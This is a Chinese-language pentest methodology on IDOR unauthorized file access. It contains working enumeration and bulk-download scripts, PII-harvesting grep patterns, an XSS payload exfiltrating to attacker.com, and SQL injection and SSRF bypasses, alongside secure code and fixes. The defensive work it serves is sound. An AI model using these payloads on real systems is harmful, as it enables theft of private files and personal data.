# **IDOR 未授权文件访问攻击方法论**

**文档版本：** 1.0  
**创建日期：** 2026 年 3 月 15 日  
**适用场景：** 不安全的直接对象引用（IDOR）导致未授权文件访问漏洞检测与利用

---

# **第一部分：文档概述**

## 1.1 编写目的
本文档为渗透测试人员提供一套标准化、可复现的 IDOR 未授权文件访问漏洞测试与利用流程。重点针对文件上传/下载系统中缺失所有权验证的场景，涵盖直接文件访问、目录列表、文件枚举等攻击技术。

## 1.2 适用范围
本文档描述的渗透技术适用于以下类型的应用和场景：
- 文件上传功能无所有权追踪机制
- 上传文件存储在 Web 可访问目录
- 文件访问端点无身份验证或授权检查
- Apache/Nginx 直接提供静态文件服务（无 PHP 代理）
- 目录列表功能启用
- 文件名可预测或可枚举
- 多用户共享文件存储命名空间

## 1.3 读者对象
- 执行渗透测试任务的安全工程师
- 安全分析师
- 负责代码审计的开发人员
- 红队渗透测试人员

---

# **第二部分：核心渗透技术专题**

## 专题一：IDOR 未授权文件访问攻击

### 2.1 技术介绍

**漏洞原理：**
IDOR（Insecure Direct Object Reference，不安全直接对象引用）未授权文件访问漏洞是指应用程序在存储用户上传的文件时，未建立文件与用户之间的所有权关系，且文件访问端点缺少授权检查，导致任何用户（包括未认证用户）均可通过直接请求文件 URL 访问任意上传文件。

**漏洞本质：**
- 缺失所有权元数据：数据库无文件 - 用户关联表
- 缺失访问控制：文件下载端点无权限验证
- 共享命名空间：所有用户上传到同一目录
- 静态文件服务：Web 服务器直接提供文件，绕过应用层检查

**典型漏洞代码模式：**
```php
// 危险代码示例 - 文件上传无所有权追踪

// upload.php - 上传处理
$uploadFileDir = './uploaded_invoices/';  // 共享目录
$fileName = $_FILES['invoice']['name'];   // 无文件名 sanitization
$dest_path = $uploadFileDir . $fileName;  // 无用户 ID 前缀
move_uploaded_file($fileTmpPath, $dest_path);

// 关键问题：
// 1. 无数据库 INSERT 记录文件所有权
// 2. 无用户 ID 与文件关联
// 3. 无唯一文件名生成（时间戳/UUID）

// 文件访问 - 无 PHP 代理，Apache 直接服务
// http://target/uploaded_invoices/{filename}
// 无 session 检查，无所有权验证
```

### 2.2 攻击常见于哪些业务场景

| **业务场景** | **功能示例** | **风险点描述** |
|-------------|-------------|---------------|
| **发票上传** | 上传 PDF 发票 | 所有用户上传到共享目录，无访问控制 |
| **文档管理** | 上传合同/协议 | 敏感文档可被未授权访问 |
| **头像上传** | 用户头像存储 | 头像文件 URL 可预测 |
| **报告下载** | 生成并下载报告 | 报告文件无访问控制 |
| **备份下载** | 数据库备份文件 | 备份文件 Web 可访问 |
| **日志下载** | 系统日志导出 | 日志文件包含敏感信息 |
| **图片分享** | 上传图片生成链接 | 图片 URL 可枚举 |
| **简历上传** | 求职简历存储 | 简历含 PII 信息可被访问 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试 - 文件访问探测

**步骤 1：识别上传目录**

```bash
# 方法 1：上传文件后观察响应
curl -X POST http://target/upload.php \
  -F "invoice=@test.pdf" \
  -b "PHPSESSID=valid_session" \
  -v 2>&1 | grep -i "location:\|uploaded_invoices"

# 方法 2：查看页面 HTML 中的文件链接
curl -s http://target/dashboard.php | grep -oP 'href="[^"]*\.(pdf|jpg|png)"'

# 方法 3：常见上传目录枚举
for dir in uploaded_invoices uploads files attachments documents; do
    curl -s -o /dev/null -w "%{http_code}" "http://target/$dir/"
done
```

**步骤 2：测试目录列表**

```bash
# 测试目录列表是否启用
curl -v http://target/uploaded_invoices/

# 预期输出（存在漏洞）：
# <title>Index of /uploaded_invoices</title>
# <tr><td>admin_invoice.pdf</td></tr>
# <tr><td>confidential.pdf</td></tr>
```

**步骤 3：测试未授权访问**

```bash
# 不使用任何认证访问文件
curl -v http://target/uploaded_invoices/test.pdf

# 预期输出（存在漏洞）：
# HTTP/1.1 200 OK
# Content-Type: application/pdf
# Content-Length: 12345
# 
# [PDF 文件内容]
```

**步骤 4：批量文件枚举**

```bash
# 如果目录列表禁用，尝试常见文件名
common_names=(
    "invoice.pdf"
    "receipt.pdf"
    "document.pdf"
    "file.pdf"
    "upload.pdf"
    "admin_invoice.pdf"
    "confidential.pdf"
    "test.pdf"
)

for name in "${common_names[@]}"; do
    status=$(curl -s -o /dev/null -w "%{http_code}" \
        "http://target/uploaded_invoices/$name")
    if [ "$status" == "200" ]; then
        echo "[+] Found: $name"
        curl -o "/tmp/$name" "http://target/uploaded_invoices/$name"
    fi
done
```

#### 2.3.2 白盒测试 - 代码审计

**审计关键词搜索：**
```bash
# 搜索文件上传目录配置
grep -rn "uploaded_invoices\|upload_dir\|upload_path" /path/to/code

# 搜索文件移动操作
grep -rn "move_uploaded_file" /path/to/code

# 搜索文件访问端点
grep -rn "uploaded_invoices/\|files/\|downloads/" /path/to/code

# 搜索所有权检查
grep -rn "owner\|ownership\|user_id.*file\|file.*user_id" /path/to/code
# 预期：无结果（漏洞指标）
```

**危险代码模式识别：**
```php
// 危险模式 1：共享上传目录
$uploadFileDir = './uploaded_invoices/';  // 所有用户共享

// 危险模式 2：无用户 ID 前缀
$dest_path = $uploadFileDir . $fileName;  // 应该是 ./uploaded_invoices/{user_id}_{fileName}

// 危险模式 3：无数据库记录
move_uploaded_file($fileTmpPath, $dest_path);
// 缺少：INSERT INTO files (filename, owner_user_id, path) VALUES (...)

// 危险模式 4：Apache 直接服务
// 无 download.php 代理，文件直接通过 Apache 访问
// http://target/uploaded_invoices/file.pdf
```

**数据库 schema 检查：**
```sql
-- 检查是否存在文件所有权表
SHOW TABLES LIKE '%file%';
SHOW TABLES LIKE '%upload%';

-- 检查 users 表是否有文件关联
DESCRIBE users;
-- 应该查找：file_id, upload_path 等字段

-- 如果无相关文件表，存在 IDOR 漏洞
```

### 2.4 漏洞利用方法

#### 2.4.1 目录列表枚举攻击

**攻击场景：** 目录列表启用，攻击者可直接获取所有文件名。

**步骤 1：获取目录列表**

```bash
# 获取完整目录列表
curl -s http://target/uploaded_invoices/ > /tmp/dir_listing.html

# 提取所有文件名
grep -oP 'href="\K[^"]+' /tmp/dir_listing.html | grep -v "Parent Directory" > /tmp/file_list.txt

echo "[*] Found files:"
cat /tmp/file_list.txt
```

**步骤 2：批量下载文件**

```bash
#!/bin/bash
# 批量下载枚举的文件

TARGET_DIR="http://target/uploaded_invoices"
OUTPUT_DIR="/tmp/stolen_files"
mkdir -p "$OUTPUT_DIR"

# 读取文件列表
while IFS= read -r filename; do
    echo "[*] Downloading: $filename"
    curl -s -o "$OUTPUT_DIR/$filename" "$TARGET_DIR/$filename"
done < /tmp/file_list.txt

echo "[+] Download complete: $OUTPUT_DIR"
```

**步骤 3：自动化目录列表提取脚本**

```python
#!/usr/bin/env python3
"""
Apache 目录列表提取工具
从 HTML 目录列表页面提取所有文件
"""

import requests
from bs4 import BeautifulSoup
import os

def extract_files_from_directory_listing(url, output_dir="/tmp/stolen_files"):
    """从 Apache 目录列表提取所有文件"""
    
    os.makedirs(output_dir, exist_ok=True)
    
    # 获取目录列表页面
    response = requests.get(url)
    if response.status_code != 200:
        print(f"[-] Failed to access directory: {response.status_code}")
        return []
    
    # 解析 HTML
    soup = BeautifulSoup(response.text, 'html.parser')
    
    files = []
    for link in soup.find_all('a'):
        href = link.get('href')
        # 跳过父目录链接和空链接
        if href and href != '../' and href != '/':
            files.append(href)
    
    print(f"[*] Found {len(files)} files")
    
    # 下载所有文件
    downloaded = []
    for filename in files:
        file_url = url.rstrip('/') + '/' + filename
        print(f"[*] Downloading: {filename}")
        
        file_response = requests.get(file_url)
        if file_response.status_code == 200:
            output_path = os.path.join(output_dir, filename)
            with open(output_path, 'wb') as f:
                f.write(file_response.content)
            downloaded.append(filename)
            print(f"    [+] Saved: {output_path}")
        else:
            print(f"    [-] Failed: {file_response.status_code}")
    
    return downloaded

if __name__ == "__main__":
    files = extract_files_from_directory_listing(
        "http://target/uploaded_invoices/"
    )
    print(f"\n[*] Total downloaded: {len(files)} files")
```

#### 2.4.2 文件名预测攻击

**攻击场景：** 目录列表禁用，但文件名可预测。

**步骤 1：分析文件名模式**

```bash
# 上传多个测试文件分析命名模式
for i in {1..5}; do
    echo "Test content $i" > "/tmp/test_$i.pdf"
    curl -X POST http://target/upload.php \
        -F "invoice=@/tmp/test_$i.pdf" \
        -b "PHPSESSID=valid_session"
done

# 观察响应或页面中的文件引用
# 可能的模式：
# - 原始文件名（无变化）
# - 时间戳前缀：20260315_123456_file.pdf
# - 用户 ID 前缀：user_123_file.pdf
# - 随机前缀：abc123_file.pdf
```

**步骤 2：基于模式枚举**

```bash
#!/bin/bash
# 基于时间戳的文件名预测

TARGET="http://target/uploaded_invoices"

# 获取当前时间戳
timestamp=$(date +%Y%m%d)

# 尝试常见命名模式
patterns=(
    "invoice.pdf"
    "invoice_${timestamp}.pdf"
    "${timestamp}_invoice.pdf"
    "upload.pdf"
    "document.pdf"
    "file.pdf"
)

for pattern in "${patterns[@]}"; do
    status=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/$pattern")
    if [ "$status" == "200" ]; then
        echo "[+] Found: $pattern"
    fi
done
```

**步骤 3：暴力枚举文件名**

```bash
#!/bin/bash
# 文件名暴力枚举

TARGET="http://target/uploaded_invoices"
extensions=("pdf" "jpg" "png" "doc" "docx" "txt")

# 数字枚举
for i in {1..100}; do
    for ext in "${extensions[@]}"; do
        filename="file_${i}.${ext}"
        status=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/$filename")
        if [ "$status" == "200" ]; then
            echo "[+] Found: $filename"
        fi
    done
done

# UUID 枚举（如果使用前缀）
for i in {1..10}; do
    uuid=$(cat /proc/sys/kernel/random/uuid 2>/dev/null || echo "uuid-$RANDOM")
    for ext in "${extensions[@]}"; do
        filename="${uuid}.${ext}"
        status=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/$filename")
        if [ "$status" == "200" ]; then
            echo "[+] Found: $filename"
        fi
    done
done
```

#### 2.4.3 敏感信息提取

**攻击场景：** 成功访问文件后，提取敏感信息。

**步骤 1：PDF 文件内容提取**

```bash
# 使用 pdftotext 提取 PDF 内容
pdftotext /tmp/stolen_files/invoice.pdf - | head -50

# 或使用 strings 提取可读文本
strings /tmp/stolen_files/invoice.pdf | head -50
```

**步骤 2：图片 OCR 识别**

```bash
# 使用 tesseract 进行 OCR
tesseract /tmp/stolen_files/scanned_doc.jpg stdout
```

**步骤 3：敏感信息搜索**

```bash
#!/bin/bash
# 在提取的文件中搜索敏感信息

SEARCH_DIR="/tmp/stolen_files"

echo "[*] Searching for sensitive patterns..."

# 邮箱
grep -rhoE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' "$SEARCH_DIR" | sort -u

# 电话号码
grep -rhoE '\+?[0-9]{1,3}[-. ]?[0-9]{3}[-. ]?[0-9]{3}[-. ]?[0-9]{4}' "$SEARCH_DIR" | sort -u

# 身份证号（中国）
grep -rhoE '[1-9][0-9]{5}(19|20)[0-9]{2}(0[1-9]|1[0-2])(0[1-9]|[12][0-9]|3[01])[0-9]{3}[0-9Xx]' "$SEARCH_DIR" | sort -u

# 银行卡号
grep -rhoE '[0-9]{4}[- ]?[0-9]{4}[- ]?[0-9]{4}[- ]?[0-9]{4}' "$SEARCH_DIR" | sort -u

# 密码模式
grep -rhoiE 'password[:= ]+[^ ]+' "$SEARCH_DIR" | sort -u
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过访问控制列表

```bash
# 如果存在简单的 Referer 检查
curl -s -e "http://target/dashboard.php" \
    "http://target/uploaded_invoices/file.pdf" \
    -o stolen.pdf

# 如果存在 IP 限制，通过 SSRF 绕过
curl -X POST "http://target/ssrf-endpoint" \
    -d "url=http://localhost/uploaded_invoices/file.pdf"
```

#### 2.5.2 绕过文件名随机化

```bash
# 如果文件名包含随机前缀，通过其他方式获取
# 方法 1：XSS 窃取文件列表
<img src=x onerror="fetch('/dashboard.php').then(r=>r.text()).then(h=>{
    files = h.match(/href=\"([^\"]*\.pdf)\"/g);
    fetch('http://attacker.com/?files='+encodeURIComponent(files));
})">

# 方法 2：通过 SQL 注入获取文件名
# 如果存在文件元数据表
curl -X POST http/target/login.php \
    -d "username=admin' UNION SELECT GROUP_CONCAT(filename) FROM files-- -&password=test"
```

---

# **第三部分：附录**

## 3.1 IDOR 文件访问风险速查表

| **风险类型** | **攻击方式** | **影响** | **利用难度** |
|-------------|-------------|---------|-------------|
| **目录列表** | 直接访问上传目录 | 所有文件暴露 | 极低 |
| **文件名预测** | 枚举常见文件名 | 部分文件暴露 | 低 |
| **未授权下载** | 直接请求文件 URL | 敏感数据泄露 | 极低 |
| **所有权绕过** | 访问其他用户文件 | 横向权限提升 | 低 |
| **敏感信息提取** | PDF/图片内容分析 | PII 泄露 | 中 |

## 3.2 安全配置代码示例

```php
// 安全代码示例 - 文件上传与访问控制

// 1. 上传时生成唯一文件名并记录所有权
function upload_file($file, $user_id) {
    $upload_dir = '/var/uploads/';  // Web 不可访问目录
    
    // 生成唯一文件名
    $extension = pathinfo($file['name'], PATHINFO_EXTENSION);
    $safe_filename = bin2hex(random_bytes(16)) . '.' . $extension;
    
    // 移动文件到安全目录
    $dest_path = $upload_dir . $safe_filename;
    move_uploaded_file($file['tmp_name'], $dest_path);
    
    // 记录到数据库（所有权追踪）
    $stmt = $db->prepare("INSERT INTO files (user_id, filename, original_name, path) VALUES (?, ?, ?, ?)");
    $stmt->bind_param("isss", $user_id, $safe_filename, $file['name'], $dest_path);
    $stmt->execute();
    
    return $safe_filename;
}

// 2. 文件下载代理（强制授权检查）
function download_file($file_id, $user_id) {
    // 验证文件所有权
    $stmt = $db->prepare("SELECT path, original_name FROM files WHERE id = ? AND user_id = ?");
    $stmt->bind_param("ii", $file_id, $user_id);
    $stmt->execute();
    $result = $stmt->get_result();
    
    if ($result->num_rows === 0) {
        http_response_code(403);
        die("Access denied");
    }
    
    $file = $result->fetch_assoc();
    
    // 从安全目录读取文件
    if (!file_exists($file['path'])) {
        http_response_code(404);
        die("File not found");
    }
    
    // 设置下载头
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . basename($file['original_name']) . '"');
    header('Content-Length: ' . filesize($file['path']));
    
    // 输出文件内容
    readfile($file['path']);
}

// 3. Apache 配置 - 禁止直接访问上传目录
// .htaccess in /var/uploads/
// Deny from all
```

## 3.3 自动化检测脚本

```bash
#!/bin/bash
# IDOR 文件访问漏洞检测脚本

TARGET="$1"
OUTPUT_DIR="/tmp/idor_audit_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTPUT_DIR"

echo "=========================================="
echo "IDOR File Access Security Audit"
echo "Target: $TARGET"
echo "Output: $OUTPUT_DIR"
echo "=========================================="

# 测试 1：常见上传目录枚举
echo ""
echo "[*] Test 1: Enumerating upload directories..."
directories=(
    "uploaded_invoices"
    "uploads"
    "files"
    "attachments"
    "documents"
    "downloads"
    "user_files"
)

for dir in "${directories[@]}"; do
    status=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/$dir/")
    if [ "$status" == "200" ]; then
        echo "[+] Found directory: $dir"
        curl -s "$TARGET/$dir/" > "$OUTPUT_DIR/${dir}_listing.html"
    fi
done

# 测试 2：检查目录列表
echo ""
echo "[*] Test 2: Checking directory listing..."
for listing_file in "$OUTPUT_DIR"/*_listing.html; do
    if [ -f "$listing_file" ]; then
        if grep -q "Index of" "$listing_file"; then
            dir_name=$(basename "$listing_file" _listing.html)
            echo "[+] Directory listing ENABLED: $dir_name"
            
            # 提取文件列表
            grep -oP 'href="\K[^"]+' "$listing_file" | grep -v "Parent Directory" > "$OUTPUT_DIR/${dir_name}_files.txt"
            echo "    Files found: $(wc -l < "$OUTPUT_DIR/${dir_name}_files.txt")"
        fi
    fi
done

# 测试 3：测试未授权访问
echo ""
echo "[*] Test 3: Testing unauthorized access..."
if [ -f "$OUTPUT_DIR/uploaded_invoices_files.txt" ]; then
    while IFS= read -r filename; do
        if [ -n "$filename" ]; then
            status=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/uploaded_invoices/$filename")
            if [ "$status" == "200" ]; then
                echo "[+] Unauthenticated access: uploaded_invoices/$filename"
                curl -s -o "$OUTPUT_DIR/stolen_$filename" "$TARGET/uploaded_invoices/$filename"
            fi
        fi
    done < "$OUTPUT_DIR/uploaded_invoices_files.txt"
fi

# 测试 4：常见文件名探测
echo ""
echo "[*] Test 4: Probing common filenames..."
common_files=(
    "invoice.pdf"
    "receipt.pdf"
    "document.pdf"
    "file.pdf"
    "test.pdf"
    "admin.pdf"
    "confidential.pdf"
)

for file in "${common_files[@]}"; do
    for dir in "${directories[@]}"; do
        status=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/$dir/$file")
        if [ "$status" == "200" ]; then
            echo "[+] Found: $dir/$file"
        fi
    done
done

echo ""
echo "=========================================="
echo "Audit Complete"
echo "Results saved to: $OUTPUT_DIR"
echo "=========================================="
```

## 3.4 修复建议

**文件上传安全配置清单：**

1. **所有权追踪**
   - 数据库记录文件与用户的关联
   - 存储 `user_id`, `filename`, `original_name`, `upload_time`

2. **唯一文件名**
   - 使用 UUID 或随机字符串作为文件名
   - 避免使用原始文件名

3. **访问控制**
   - 实现下载代理端点（download.php）
   - 每次下载验证文件所有权
   - 禁止 Web 服务器直接服务上传目录

4. **存储隔离**
   - 使用用户特定子目录：`/uploads/{user_id}/`
   - 或将上传目录放在 Web 根目录外

5. **Apache 配置**
   ```apache
   # 禁止直接访问上传目录
   <Directory "/var/www/html/uploaded_invoices">
       Deny from all
   </Directory>
   ```

---

**文档结束**
